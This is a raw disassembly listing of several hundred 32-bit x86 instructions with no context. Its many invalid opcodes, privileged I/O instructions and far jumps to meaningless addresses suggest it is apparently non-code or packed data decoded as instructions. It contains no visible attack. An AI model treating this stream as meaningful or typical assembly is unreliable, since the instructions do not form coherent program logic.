  421e97:	imul   esi,DWORD PTR [eax+0x4d],0xb
  421e9b:	sbb    eax,ebx
  421e9d:	bound  eax,QWORD PTR [ebx]
  421e9f:	pop    eax
  421ea0:	fwait
  421ea1:	push   es
  421ea2:	jae    0x421e7a
  421ea4:	cmp    eax,0x2a504df1
  421ea9:	inc    eax
  421eaa:	into   
  421eab:	je     0x421ebd
  421ead:	mov    ecx,0xd4d5eb4f
  421eb2:	xor    al,0xf3
  421eb4:	xchg   ecx,eax
  421eb5:	stc    
  421eb6:	loop   0x421ec2
  421eb8:	xchg   BYTE PTR [ebx-0x30b42140],ch
  421ebe:	pushf  
  421ebf:	cld    
  421ec0:	pop    ecx
  421ec1:	nop
  421ec2:	push   edx
  421ec3:	xchg   ebx,eax
  421ec4:	shl    DWORD PTR [esi-0x39],1
  421ec7:	fisub  DWORD PTR [ecx]
  421ec9:	je     0x421f10
  421ecb:	inc    edx
  421ecc:	xchg   edi,eax
  421ecd:	xor    al,0x4c
  421ecf:	stos   DWORD PTR es:[edi],eax
  421ed0:	xchg   edi,eax
  421ed1:	push   ds
  421ed2:	fucomi st,st(6)
  421ed4:	iret   
  421ed5:	lods   eax,DWORD PTR ds:[esi]
  421ed6:	adc    DWORD PTR [ecx+0x77191195],ebp
  421edc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421edd:	ret    0x3e89
  421ee0:	mov    dh,0x23
  421ee2:	dec    ebp
  421ee3:	lods   eax,DWORD PTR ds:[esi]
  421ee4:	popa   
  421ee5:	fmul   st(3),st
  421ee7:	cli    
  421ee8:	mov    ebx,0xcad8c7e
  421eed:	adc    al,0x79
  421eef:	aad    0x62
  421ef1:	mov    esi,0x8d7ded51
  421ef6:	inc    eax
  421ef7:	into   
  421ef8:	dec    esp
  421ef9:	repnz cmp BYTE PTR [ecx+0x7fbadf76],cl
  421f00:	in     al,dx
  421f01:	mov    cl,0x11
  421f03:	xchg   ebp,eax
  421f04:	mov    ds:0x981bb780,eax
  421f09:	mov    dl,0xa7
  421f0b:	xor    ebp,ebp
  421f0d:	mov    al,ds:0x2f57846b
  421f12:	push   ss
  421f13:	pop    esp
  421f14:	adc    BYTE PTR [ecx+0x36],ah
  421f17:	xlat   BYTE PTR ds:[ebx]
  421f18:	int3   
  421f19:	cmp    ecx,DWORD PTR [edi+0x2c9ff5b]
  421f1f:	push   es
  421f20:	inc    edx
  421f21:	sbb    eax,0xddf2b704
  421f26:	xchg   edi,eax
  421f27:	(bad)  
  421f28:	push   edi
  421f29:	push   edi
  421f2a:	scas   eax,DWORD PTR es:[edi]
  421f2b:	inc    eax
  421f2c:	jmp    0x421f15
  421f2e:	mov    ebx,eax
  421f30:	dec    ebp
  421f31:	outs   dx,DWORD PTR ds:[esi]
  421f32:	mov    bh,0x40
  421f34:	or     BYTE PTR [esi-0x1644a5e1],ch
  421f3a:	xor    al,0x98
  421f3c:	repnz push ebx
  421f3e:	pop    ecx
  421f3f:	sbb    BYTE PTR [eax+0xf4330f4],ah
  421f45:	icebp  
  421f46:	fimul  DWORD PTR [eax+0xdbf54b1]
  421f4c:	mov    edi,0x85759a3d
  421f51:	add    eax,0x50a4cf1b
  421f56:	push   es
  421f57:	mov    BYTE PTR [ecx-0x3387b2bb],al
  421f5d:	mov    al,dh
  421f5f:	mov    ebp,DWORD PTR [edx-0x345778a5]
  421f65:	stos   BYTE PTR es:[edi],al
  421f66:	jne    0x421f76
  421f68:	xchg   BYTE PTR [edx-0x24],bh
  421f6b:	push   0x45
  421f6d:	xchg   BYTE PTR [esi+0x63],bh
  421f70:	mov    edi,0xc8fec1e9
  421f75:	sbb    BYTE PTR [ecx-0x3f],dh
  421f78:	fisub  DWORD PTR [ebp+0xf]
  421f7b:	test   bl,bh
  421f7d:	jnp    0x421fd6
  421f7f:	pop    eax
  421f80:	xor    eax,0xa79e4793
  421f85:	pop    edi
  421f86:	cwde   
  421f87:	popf   
  421f88:	adc    al,0x68
  421f8a:	dec    esi
  421f8b:	sub    esp,ebx
  421f8d:	push   ebp
  421f8e:	test   DWORD PTR [edi-0x55],esi
  421f91:	mov    ch,0x79
  421f94:	or     DWORD PTR [ebx],esi
  421f96:	or     DWORD PTR [eax-0xc5e0255],edx
  421f9c:	cmp    bh,BYTE PTR ds:[ebp-0x73f9913c]
  421fa3:	jmp    0x421fcd
  421fa5:	std    
  421fa6:	clc    
  421fa7:	inc    ebx
  421fa8:	pop    edi
  421fa9:	sbb    DWORD PTR [ecx+esi*4-0x82f11ed],0xffffffb2
  421fb1:	ds cmc 
  421fb3:	add    eax,0xfe33f744
  421fb8:	in     al,0x8e
  421fba:	mov    ah,0xe6
  421fbc:	mov    bh,0x28
  421fbe:	out    dx,eax
  421fbf:	mov    bl,0x76
  421fc1:	jns    0x421f6b
  421fc3:	fwait
  421fc4:	stc    
  421fc5:	pop    edx
  421fc6:	lock ficom WORD PTR [ebx+0x5d]
  421fca:	loop   0x421f4d
  421fcc:	cli    
  421fcd:	es aas 
  421fcf:	(bad)  
  421fd0:	popa   
  421fd1:	into   
  421fd2:	mov    ebx,0xb692ae60
  421fd7:	rol    dl,cl
  421fd9:	sahf   
  421fda:	jmp    0xd0955e21
  421fdf:	in     al,dx
  421fe0:	mov    esi,0x6ee4e4ae
  421fe5:	mov    cl,0xb4
  421fe7:	hlt    
  421fe8:	pop    edi
  421fe9:	rcr    BYTE PTR [ebx-0x7f0775a0],1
  421fef:	mov    esp,DWORD PTR [edi+esi*4-0x28]
  421ff3:	ret    0xfd7f
  421ff6:	shl    BYTE PTR [ebx],cl
  421ff8:	or     ecx,esi
  421ffa:	or     DWORD PTR [esi+0x542b4888],eax
  422000:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422001:	call   0xfbda:0xa67f5a51
  422008:	adc    eax,DWORD PTR [eax+0x12]
  42200b:	pop    ds
  42200c:	mov    WORD PTR [edx],es
  42200e:	cdq    
  42200f:	pop    ebp
  422010:	arpl   WORD PTR [esi+0x9443a94],si
  422016:	ins    BYTE PTR es:[edi],dx
  422017:	das    
  422018:	or     al,0xbb
  42201a:	sbb    al,0x15
  42201c:	push   es
  42201d:	mov    al,ds:0x54fa5c19
  422022:	push   cs
  422023:	ja     0x42205b
  422025:	into   
  422026:	cmp    DWORD PTR [ebx-0x52],0x74173036
  42202d:	inc    edi
  42202e:	aaa    
  42202f:	iret   
  422030:	sbb    BYTE PTR [ebx],bl
  422032:	loopne 0x421fe0
  422034:	(bad)  [edi+0x3d857193]
  42203a:	pop    eax
  42203b:	jp     0x421ffe
  42203d:	rcl    BYTE PTR [esi-0x33],0xb4
  422041:	dec    edx
  422042:	jp     0x42205e
  422044:	mov    bl,0x91
  422046:	pop    ecx
  422047:	sti    
  422048:	push   0xffffff8f
  42204a:	daa    
  42204b:	pop    eax
  42204c:	sbb    DWORD PTR [esi-0x1688e25d],edx
  422052:	ja     0x42203a
  422054:	fidivr DWORD PTR [eax]
  422056:	std    
  422057:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  422059:	shr    edi,1
  42205b:	mov    al,0x6e
  42205d:	jns    0x42204f
  42205f:	popf   
  422060:	test   ebp,esi
  422062:	inc    esp
  422063:	xor    eax,0xefe49662
  422068:	or     BYTE PTR [esi],ch
  42206a:	xchg   edx,eax
  42206b:	mov    bh,0xb8
  42206d:	and    BYTE PTR [edx-0x5d682e9d],al
  422073:	mov    ebx,edx
  422075:	mov    ds:0x972cf29d,al
  42207a:	sbb    esp,edx
  42207c:	ja     0x4220e6
  42207e:	push   esi
  42207f:	push   esi
  422080:	stos   DWORD PTR es:[edi],eax
  422081:	sbb    BYTE PTR [ecx+edx*4-0x7cbb3bd9],ch
  422088:	(bad)  
  422089:	pop    ss
  42208a:	andnps xmm4,XMMWORD PTR [esi]
  42208d:	in     eax,0x4d
  42208f:	mov    DWORD PTR [eax+ebp*1-0x12],esi
  422093:	jno    0x4220af
  422095:	xchg   BYTE PTR cs:[ebx-0x23],cl
  422099:	stos   DWORD PTR es:[edi],eax
  42209a:	mov    ch,0x9
  42209c:	jb     0x42208b
  42209e:	push   edi
  42209f:	inc    eax
  4220a0:	daa    
  4220a1:	test   al,0x3
  4220a3:	jns    0x4220ef
  4220a5:	adc    ah,BYTE PTR [eax-0x2d]
  4220a8:	dec    esp
  4220a9:	sbb    eax,0x9c7be24a
  4220ae:	xor    al,0xf5
  4220b0:	outs   dx,BYTE PTR ds:[esi]
  4220b1:	arpl   di,bp
  4220b3:	xchg   edx,eax
  4220b4:	outs   dx,BYTE PTR ds:[esi]
  4220b5:	jmp    0xc1d51856
  4220ba:	xchg   ebp,eax
  4220bb:	ins    BYTE PTR es:[edi],dx
  4220bc:	jo     0x422044
  4220be:	sbb    esi,DWORD PTR [esi+eiz*8]
  4220c1:	sbb    BYTE PTR [ebx],dl
  4220c3:	jecxz  0x42205a
  4220c5:	ss jmp 0xa578:0xa00cd0ed
  4220cd:	fsubr  DWORD PTR [ebx+0x7f]
  4220d0:	pop    esi
  4220d1:	test   DWORD PTR [ecx],0x202add56
  4220d7:	mov    esi,0xc0c6edd7
  4220dc:	test   BYTE PTR [ebx+0x60],ch
  4220df:	fadd   QWORD PTR [ecx+edi*1]
  4220e2:	mov    eax,0x2d345bec
  4220e7:	sub    al,dh
  4220e9:	(bad)  
  4220ea:	call   0xefba:0xf4495f18
  4220f1:	xchg   ebp,eax
  4220f2:	out    0xcf,eax
  4220f4:	mov    eax,0x539c7fd9
  4220f9:	stos   BYTE PTR es:[edi],al
  4220fa:	xor    BYTE PTR [ebp+0x23],dl
  4220fd:	ds (bad) 
  4220ff:	retf   
  422100:	mov    al,ds:0x97143208
  422105:	xchg   ecx,eax
  422106:	or     ah,BYTE PTR [ecx]
  422108:	fcomp  st(6)
  42210a:	adc    eax,0x91ad7e0f
  42210f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422110:	pop    esp
  422111:	pop    ebp
  422112:	pop    ss
  422113:	sub    dl,dl
  422115:	pop    esp
  422116:	dec    edi
  422117:	arpl   WORD PTR [eax-0x484fe523],bx
  42211d:	rcl    BYTE PTR [ecx-0x31a22672],1
  422123:	in     eax,0xf7
  422125:	aam    0xd8
  422127:	and    BYTE PTR [esi-0x558bf4d2],dh
  42212d:	dec    ebx
  42212e:	test   ch,al
  422130:	add    al,BYTE PTR [esi]
  422132:	(bad)  
  422134:	mov    ecx,?
  422136:	repnz fs xchg ebp,eax
  422139:	call   0xdb15:0xd70c7be0
  422140:	inc    ecx
  422141:	adc    al,0x99
  422143:	mov    esp,edx
  422145:	cli    
  422146:	mov    BYTE PTR [edx],cl
  422148:	nop
  422149:	jle    0x422109
  42214b:	jmp    0xb8e9:0xf5151f72
  422152:	sahf   
  422153:	sub    bh,BYTE PTR [eax]
  422155:	gs retf 
  422157:	mov    al,0x2d
  422159:	and    BYTE PTR [ecx],bl
  42215b:	mov    dh,0x95
  42215d:	inc    esi
  42215e:	test   DWORD PTR [ebx+ecx*4],esi
  422161:	in     al,0x5a
  422163:	lds    edi,FWORD PTR [ebx-0x4bf650f7]
  422169:	mov    dl,0xf
  42216b:	arpl   WORD PTR [esi-0x8c82b33],sp
  422171:	push   es
  422172:	pshufw mm5,QWORD PTR [edi],0xfc
  422176:	ret    0xae00
  422179:	lea    eax,[edx-0x35]
  42217c:	inc    edx
  42217d:	push   ds
  42217e:	pusha  
  42217f:	push   ebp
  422180:	xchg   ebp,eax
  422181:	dec    esp
  422182:	inc    esp
  422183:	xchg   ebx,eax
  422184:	movups XMMWORD PTR ds:0x35de98ea,xmm2
  42218b:	(bad)  
  42218c:	mov    ebx,0xbf4bdf7
  422191:	dec    esi
  422192:	mov    esp,eax
  422194:	jp     0x4221f4
  422196:	pop    eax
  422197:	test   DWORD PTR [eax],eax
  422199:	js     0x422131
  42219b:	dec    ebp
  42219c:	cmp    BYTE PTR [edi-0x53],al
  42219f:	and    ebx,eax
  4221a1:	mov    ah,0x74
  4221a3:	or     dl,BYTE PTR [ebx+0x3c456bbc]
  4221a9:	rcr    DWORD PTR [eax+0x23],1
  4221ac:	pavgw  mm0,QWORD PTR [ebx+0x6a6e05a1]
  4221b3:	cmp    DWORD PTR [ecx-0x9135e35],0x77
  4221ba:	sbb    eax,0x6524c97c
  4221bf:	push   eax
  4221c0:	add    eax,0x122da480
  4221c5:	or     BYTE PTR [ecx+ebp*1+0xefe6a91],bh
  4221cc:	cmp    BYTE PTR [ebp+0x2ef52471],bh
  4221d2:	test   DWORD PTR [edx+0x394fe6c2],eax
  4221d8:	xchg   esp,eax
  4221d9:	leave  
  4221da:	mov    al,0xad
  4221dc:	pop    ebx
  4221dd:	pop    ebp
  4221de:	mov    ds:0x877729c2,al
  4221e3:	jbe    0x42223b
  4221e5:	mov    edx,0x70dd79fc
  4221ea:	lods   eax,DWORD PTR ds:[esi]
  4221eb:	mov    ds:0x905e1bab,eax
  4221f0:	dec    ecx
  4221f1:	in     eax,dx
  4221f2:	jnp    0x422267
  4221f4:	jae    0x4221cb
  4221f6:	jmp    0x60fb973d
  4221fb:	fimul  DWORD PTR [eax+ecx*4-0x19ea110a]
  422202:	jno    0x42224a
  422204:	mov    cl,0x2b
  422206:	lea    eax,[edx+ebp*2]
  422209:	test   al,0xf4
  42220b:	mov    edi,0xd6a4701d
  422210:	sbb    eax,0x7e2ad612
  422215:	pop    esp
  422216:	dec    ebp
  422217:	xor    bl,BYTE PTR [eax+0x5855fae4]
  42221d:	mov    ah,0x97
  42221f:	ds ins BYTE PTR es:[edi],dx
  422221:	sbb    edx,DWORD PTR [ebp+0x2b]
  422224:	rcl    BYTE PTR [edi],1
  422226:	cmp    ecx,DWORD PTR [ecx+edi*4]
  422229:	pop    ecx
  42222a:	push   ss
  42222b:	cmp    al,0x99
  42222d:	dec    esp
  42222e:	repz xchg edi,eax
  422230:	jg     0x42228f
  422232:	adc    eax,0x7b163b46
  422237:	xor    eax,0xa6db915f
  42223c:	aam    0x4c
  42223e:	aad    0x2f
  422240:	mov    bl,BYTE PTR [edi]
  422242:	das    
  422243:	test   BYTE PTR [ebx],dh
  422245:	mov    ds,WORD PTR [esi]
  422247:	mov    bl,0xc4
  422249:	out    0xd6,eax
  42224b:	scas   al,BYTE PTR es:[edi]
  42224c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42224d:	cmp    BYTE PTR [ebx-0x609c5605],bl
  422253:	cmp    eax,DWORD PTR [ebp-0x41]
  422256:	add    eax,0x9df528b9
  42225b:	cmp    al,0x7d
  42225d:	lds    ebp,FWORD PTR [eax]
  42225f:	sub    eax,0x9a3f93c1
  422264:	test   DWORD PTR [eax-0x74],0x74e42792
  42226b:	call   0x208e2d5c
  422270:	repnz and ebx,edx
  422273:	sbb    edx,DWORD PTR [ebp+0x605fddeb]
  422279:	rcl    BYTE PTR [edi+ebx*8-0x250a1635],0x88
  422281:	scas   eax,DWORD PTR es:[edi]
  422282:	rcl    BYTE PTR [edx],cl
  422284:	pop    sp
  422286:	cwde   
  422287:	cwde   
  422288:	mov    bh,dl
  42228a:	out    dx,eax
  42228b:	mov    WORD PTR [edx-0x3fa6898],cs
  422291:	jns    0x422312
  422293:	hlt    
  422294:	pusha  
  422295:	dec    edx
  422296:	in     al,dx
  422297:	mov    ebp,0x819a407e
  42229c:	cmp    eax,ebp
  42229e:	stc    
  42229f:	je     0x422297
  4222a1:	addr16 jns 0x42229e
  4222a4:	nop
  4222a5:	out    0x99,al
  4222a7:	xor    al,0xb6
  4222a9:	jnp    0x4222b4
  4222ab:	sbb    al,0xfb
  4222ad:	cmp    al,0x69
  4222af:	push   edx
  4222b0:	xor    edx,ebp
  4222b2:	ror    DWORD PTR [ebx+0x4852bf5],cl
  4222b8:	jecxz  0x422294
  4222ba:	in     eax,0x38
  4222bc:	in     al,0xd5
  4222be:	ret    0x71c0
  4222c1:	(bad)  
  4222c2:	fdivp  st(3),st
  4222c4:	(bad)  
  4222c5:	ror    ebp,cl
  4222c7:	out    0xb1,al
  4222c9:	pop    eax
  4222ca:	sbb    BYTE PTR [ebx],0x1c
  4222cd:	test   DWORD PTR [ebx-0x57],edi
  4222d0:	cmp    ch,bl
  4222d2:	mov    eax,ds:0x25c8719c
  4222d7:	dec    edx
  4222d8:	push   ebx
  4222d9:	jecxz  0x42233d
  4222db:	dec    ebx
  4222dc:	or     al,bl
  4222de:	leave  
  4222df:	ja     0x4222e8
  4222e1:	cvtps2pi mm6,QWORD PTR [eax-0x7]
  4222e5:	pop    esi
  4222e6:	sub    DWORD PTR [ebx],edx
  4222e8:	pop    ecx
  4222e9:	(bad)  
  4222ea:	dec    ecx
  4222eb:	xchg   esp,eax
  4222ec:	ret    0x850e
  4222ef:	mov    edx,0x80f37efb
  4222f4:	pop    ecx
  4222f5:	mov    al,ds:0x20052a57
  4222fa:	out    0xaf,eax
  4222fc:	mov    ds:0x2ffd6449,eax
  422301:	in     al,dx
  422302:	add    eax,0x2fbf8d9b
  422307:	into   
  422308:	and    al,0x42
  42230a:	hlt    
  42230b:	mov    esi,0x2c910b24
  422310:	mov    esp,0x64baca2c
  422315:	shl    DWORD PTR [edx],1
  422317:	icebp  
  422318:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422319:	scas   eax,DWORD PTR es:[edi]
  42231a:	mov    DWORD PTR [ebx-0x6c58e5fe],edx
  422320:	jb     0x42234b
  422322:	adc    BYTE PTR [edi],al
  422324:	dec    ebx
  422325:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422326:	ret    
  422327:	sbb    esi,eax
  422329:	jnp    0x42234a
  42232b:	sahf   
  42232c:	mov    DWORD PTR [edi+edx*1-0x3ef15ce6],edi
  422333:	sub    eax,0xe2811e93
  422338:	clc    
  422339:	je     0x422385
  42233b:	mov    esi,0x88a72b5b
  422340:	xchg   edi,eax
  422341:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422342:	mov    ebx,0x3d3aaab8
  422347:	aam    0x62
  422349:	sahf   
  42234a:	idiv   DWORD PTR [edx+ecx*4+0x1dac78cb]
  422351:	mov    dh,0xb5
  422353:	cmp    BYTE PTR [ebx+0x2d541988],dh
  422359:	mov    al,ds:0x598cc76d
  42235e:	jb     0x422337
  422360:	push   ebp
  422361:	adc    al,0x50
  422363:	lds    eax,FWORD PTR [ebx]
  422365:	mov    cl,0xef
  422367:	mov    eax,ds:0x5c3bf039
  42236c:	shl    cl,1
  42236e:	iret   
  42236f:	mov    ah,0xe3
  422371:	repnz aad 0x8d
  422374:	out    dx,al
  422375:	pop    ebx
  422376:	adc    dl,BYTE PTR [edx+ecx*1]
  422379:	out    dx,eax
  42237a:	lods   eax,DWORD PTR ds:[esi]
  42237b:	inc    esp
  42237c:	jno    0x4223fd
  42237e:	popa   
  42237f:	add    eax,0x982701b
  422384:	call   0x1d338699
  422389:	imul   esi,DWORD PTR [edx],0x14
  42238c:	sbb    DWORD PTR ds:0xf906b278,esp
  422392:	inc    ax
  422394:	mov    BYTE PTR [esi+0x75],ch
  422397:	in     eax,dx
  422398:	cmp    al,0x4c
  42239a:	add    al,0x22
  42239c:	mov    eax,ds:0x17d6e105
  4223a1:	mov    al,cl
  4223a3:	cmc    
  4223a4:	sbb    BYTE PTR [esi],bh
  4223a6:	stos   BYTE PTR es:[edi],al
  4223a7:	mov    ch,0xbe
  4223a9:	cmp    BYTE PTR [ecx+0x6fbbe991],dh
  4223af:	add    bl,BYTE PTR [edi-0x8acd7d1]
  4223b5:	push   0xffffff9d
  4223b7:	lods   eax,DWORD PTR ds:[esi]
  4223b8:	es je  0x422382
  4223bb:	gs mov bl,0xe4
  4223be:	dec    edx
  4223bf:	imul   esi,DWORD PTR [ebp+0x43],0xe94b37a8
  4223c6:	inc    ecx
  4223c7:	mov    edi,DWORD PTR [ebp+0x750bf337]
  4223cd:	pop    ebp
  4223ce:	inc    ecx
  4223cf:	xor    al,0x53
  4223d1:	dec    edi
  4223d2:	inc    bl
  4223d4:	addr16 mov ch,0xaa
  4223d7:	mov    DWORD PTR [ecx],esp
  4223d9:	out    0x15,eax
  4223db:	cwde   
  4223dc:	mov    ebp,0x6be17b11
  4223e1:	xor    DWORD PTR [ebp-0x21c78ac],edi
  4223e7:	adc    DWORD PTR ds:0x35550530,0xffffffe4
  4223ee:	adc    al,0x70
  4223f0:	xchg   ebx,eax
  4223f1:	mov    al,ds:0x474f70c9
  4223f6:	stos   BYTE PTR es:[edi],al
  4223f7:	adc    BYTE PTR [esi+0x5fcd7953],0x4e
  4223fe:	dec    ebp
  4223ff:	sar    BYTE PTR [edi-0x79cf6d2],0x5e
  422406:	ror    BYTE PTR [ecx],cl
  422408:	push   esp
  422409:	inc    esi
  42240a:	int    0xbb
  42240c:	xchg   esp,eax
  42240d:	cmp    DWORD PTR [edi+0x5e],ebx
  422410:	outs   dx,DWORD PTR ds:[esi]
  422411:	push   ss
  422412:	shl    BYTE PTR [ebx+ebx*2+0x29412202],1
  422419:	stc    
  42241a:	imul   ebx,DWORD PTR [ecx],0x5e0ad268
  422420:	and    DWORD PTR [edx],0x3fa54a71
  422426:	jg     0x4223cb
  422428:	aaa    
  422429:	pushf  
  42242a:	rol    eax,cl
  42242c:	in     al,0x25
  42242e:	mov    edi,0xe2ab0239
  422433:	inc    ecx
  422434:	xor    DWORD PTR [ebp+0x9],edx
  422437:	(bad)
  42243b:	or     dh,dl
  42243d:	iret   
  42243e:	xor    al,0xa
  422440:	xor    DWORD PTR [ebx+0x20],edi
  422443:	std    
  422444:	xchg   esi,eax
  422445:	int3   
  422446:	xor    ebx,0x8c983794
  42244c:	sub    DWORD PTR [esi-0x22],0x46
  422450:	sahf   
  422451:	dec    eax
  422452:	in     al,dx
  422453:	aaa    
  422454:	adc    al,0x77
  422456:	cmp    bh,BYTE PTR [ebx+ebx*2]
  422459:	es int 0xfd
  42245c:	mov    ch,0xb7
  42245e:	lods   al,BYTE PTR ds:[esi]
  42245f:	(bad)  
  422460:	and    dh,BYTE PTR [edx+0x623ff130]
  422466:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422467:	bound  esp,QWORD PTR [ebx-0x5595c6a5]
  42246d:	fild   DWORD PTR [eax+ecx*8]
  422470:	js     0x422428
  422472:	mov    ds:0xa9f57d3,al
  422477:	and    eax,0x68713280
  42247c:	(bad)  
  42247d:	outs   dx,BYTE PTR ds:[esi]
  42247e:	jmp    0x422457
  422480:	dec    ebx
  422481:	adc    eax,0x8a462664
  422486:	push   ss
  422487:	pop    esi
  422488:	xchg   ecx,eax
  422489:	jg     0x422425
  42248b:	sbb    BYTE PTR [esi+0x4a7bca3c],cl
  422491:	inc    eax
  422492:	jno    0x4224bc
  422494:	ds mov esp,0xecd54ce5
  42249a:	call   0xe61a5510
  42249f:	int    0x45
  4224a1:	ins    BYTE PTR es:[edi],dx
  4224a2:	loop   0x4224ec
  4224a4:	retf   
  4224a5:	loopne 0x4224b0
  4224a7:	(bad)  
  4224a8:	sbb    DWORD PTR [esi-0x5a],esp
  4224ab:	xchg   edi,eax
  4224ac:	mov    ecx,ds
  4224ae:	mov    eax,ss
  4224b0:	mov    bl,0x66
  4224b2:	fdiv   QWORD PTR [edx]
  4224b4:	push   ecx
  4224b5:	clc    
  4224b6:	inc    ecx
  4224b7:	or     al,0xce
  4224b9:	cli    
  4224ba:	cwde   
  4224bb:	int3   
  4224bc:	dec    edi
  4224bd:	cmc    
  4224be:	push   edi
  4224bf:	lods   eax,DWORD PTR ds:[esi]
  4224c0:	loopne 0x42245a
  4224c2:	or     edx,DWORD PTR [edx+0x50b5831b]
  4224c8:	dec    ebx
  4224c9:	mov    dl,0x3
  4224cb:	stos   DWORD PTR es:[edi],eax
  4224cc:	loope  0x4224dc
  4224ce:	stos   BYTE PTR es:[edi],al
  4224cf:	mov    al,ds:0x9c5a6d4
  4224d4:	or     al,0xd2
  4224d6:	inc    ebp
  4224d7:	inc    edx
  4224d8:	pop    edi
  4224d9:	push   esp
  4224da:	int3   
  4224db:	mov    ds:0xb6d91b06,eax
  4224e0:	les    ebp,FWORD PTR [eax-0x6a]
  4224e3:	in     eax,dx
  4224e4:	sbb    ch,BYTE PTR [esi]
  4224e6:	repnz xor al,0x91
  4224e9:	sub    DWORD PTR es:[eax-0x52],0x405a254d
  4224f1:	imul   ebx,DWORD PTR [edx+esi*2],0x17ac4fc
  4224f8:	scas   al,BYTE PTR es:[edi]
  4224f9:	pusha  
  4224fa:	pusha  
  4224fb:	mov    cl,0x66
  4224fd:	mov    ds:0xf89330b9,al
  422502:	test   BYTE PTR [edi+ebp*1+0x5b],0x67
  422507:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422508:	fisub  WORD PTR [esi+0x5e]
  42250b:	mov    bh,0xf0
  42250d:	das    
  42250e:	xor    al,BYTE PTR [ecx-0x10]
  422511:	cmp    eax,0x4722cb1c
  422516:	xchg   ebp,eax
  422517:	(bad)  
  422518:	inc    DWORD PTR [eax]
  42251a:	lods   al,BYTE PTR ds:[esi]
  42251b:	leave  
  42251c:	dec    edx
  42251d:	lock in al,dx
  42251f:	xchg   BYTE PTR [esi-0x6465560f],bl
  422525:	cmp    al,0xcd
  422527:	jne    0x422533
  422529:	es or  al,0x43
  42252c:	outs   dx,DWORD PTR ds:[esi]
  42252d:	cdq    
  42252e:	fwait
  42252f:	dec    ebx
  422530:	inc    ecx
  422531:	mov    eax,0xfe0242f4
  422536:	jno    0x4224da
  422538:	mov    eax,0xdd1d2afe
  42253d:	pusha  
  42253e:	push   esp
  42253f:	or     al,BYTE PTR [ebp+0x3e]
  422542:	inc    esi
  422543:	inc    edx
  422544:	sbb    al,0x62
  422546:	stc    
  422547:	fsub   DWORD PTR [esi+0x33be9b50]
  42254d:	ja     0x422527
  42254f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422550:	mov    bl,0xf6
  422552:	(bad)  
  422553:	mov    eax,0x7c9ab203
  422558:	aaa    
  422559:	and    BYTE PTR [eax-0x7d],ch
  42255c:	mov    eax,0x44e94ada
  422561:	out    dx,al
  422562:	jae    0x422571
  422564:	or     DWORD PTR [edi-0x5d],ebp
  422567:	popf   
  422568:	js     0x4225c1
  42256a:	sbb    eax,0x3b8429a
  42256f:	test   BYTE PTR [ebx-0x7b],ch
  422572:	lea    eax,[edi-0x7759d2ff]
  422578:	ins    DWORD PTR es:[edi],dx
  422579:	outs   dx,DWORD PTR ds:[esi]
  42257a:	push   eax
  42257b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42257c:	cmp    ah,bl
  42257e:	sbb    dl,al
  422580:	jle    0x42256c
  422582:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422583:	shr    DWORD PTR [esi+0x67bb450b],1
  422589:	inc    eax
  42258a:	sub    esi,esp
  42258c:	mov    ebx,0x7a34ec37
  422591:	in     eax,0x1c
  422593:	mov    esi,0x57868ebd
  422598:	daa    
  422599:	mov    ebp,0x4bea0868
  42259e:	(bad)  
  42259f:	arpl   ax,dx
  4225a1:	sar    BYTE PTR [esi+0x2796cafc],1
  4225a7:	mov    bl,0x60
  4225a9:	mov    ds:0x63e9c05e,al
  4225ae:	mov    dl,BYTE PTR [edx+0xd17844c]
  4225b4:	(bad)  
  4225b5:	dec    ch
  4225b7:	cwde   
  4225b8:	sbb    DWORD PTR fs:[esi-0x31],ecx
  4225bc:	and    bl,BYTE PTR [ecx-0x14]
  4225bf:	xchg   cl,bh
  4225c1:	(bad)  
  4225c2:	das    
  4225c3:	call   esi
  4225c5:	xchg   esp,eax
  4225c6:	ins    DWORD PTR es:[edi],dx
  4225c7:	and    al,0x2c
  4225c9:	shr    BYTE PTR [ebp-0x1c],1
  4225cc:	popf   
  4225cd:	xchg   DWORD PTR [ebx+0x0],edx
  4225d0:	vprotq xmm1,xmm3,xmm5
  4225d5:	jne    0x422649
  4225d7:	adc    esp,DWORD PTR [esi]
  4225d9:	push   0x9b6843ad
  4225de:	mov    ecx,0x8e2c9b23
  4225e3:	ror    BYTE PTR [edi-0x7],1
  4225e6:	test   al,0x72
  4225e8:	inc    ecx
  4225e9:	push   ebx
  4225ea:	add    BYTE PTR [ecx-0x35add387],ah
  4225f0:	pop    esp
  4225f1:	js     0x422658
  4225f3:	cdq    
  4225f4:	fistp  DWORD PTR [ecx]
  4225f6:	lods   al,BYTE PTR ds:[esi]
  4225f7:	aas    
  4225f8:	push   cs
  4225f9:	(bad)  
  4225fb:	mov    ebx,ebx
  4225fd:	pop    edx
  4225fe:	inc    esp
  4225ff:	outs   dx,BYTE PTR ds:[esi]
  422600:	pushf  
  422601:	jle    0x42258b
  422603:	and    DWORD PTR [edx-0x78],ebx
  422606:	mov    al,0xaf
  422608:	iret   
  422609:	jno    0x4225b8
  42260b:	xchg   esp,eax
  42260c:	inc    dx
  42260e:	in     eax,dx
  42260f:	ret    
  422610:	test   DWORD PTR [edx-0x38e8f27c],ecx
  422616:	call   0x14b738b0
  42261b:	jecxz  0x42261e
  42261d:	pusha  
  42261e:	icebp  
  42261f:	mov    al,ds:0x1becb17c
  422624:	sub    eax,0x95712fe4
  422629:	aas    
  42262a:	sahf   
  42262b:	sar    BYTE PTR [ebp+0x25221556],1
  422631:	out    dx,al
  422632:	ins    DWORD PTR es:[edi],dx
  422633:	dec    ecx
  422634:	lahf   
  422635:	test   BYTE PTR [edi+0x47],cl
  422638:	mov    esi,0xe97c8915
  42263d:	and    edi,esi
  42263f:	cmp    edi,DWORD PTR [edi+0x50]
  422642:	outs   dx,DWORD PTR ds:[esi]
  422643:	lock xchg ebp,eax
  422645:	xchg   edx,eax
  422646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422647:	inc    esi
